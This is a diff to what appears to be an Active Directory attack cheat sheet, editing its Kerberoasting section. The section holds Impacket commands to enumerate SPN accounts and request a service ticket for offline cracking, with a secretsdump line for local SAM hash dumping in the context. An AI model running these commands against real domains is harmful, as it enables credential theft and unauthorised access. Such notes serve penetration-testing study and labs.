@@ -121,9 +121,9 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
    ```
 # 9-Kerberoasting:
   - In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS).
-  ```
-  #look for SPN
-  impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User
-  #we can send a single request to get a TGS ticket for the target user that has SPN
-  
-  ```
+    ```
+    #look for SPN
+    impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User
+    #we can send a single request to get a TGS ticket for the target user that has SPN, since TGS is encrypted with target-user credentials we can crack it and Done!
+    impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User -request-user Target-user
+    ```
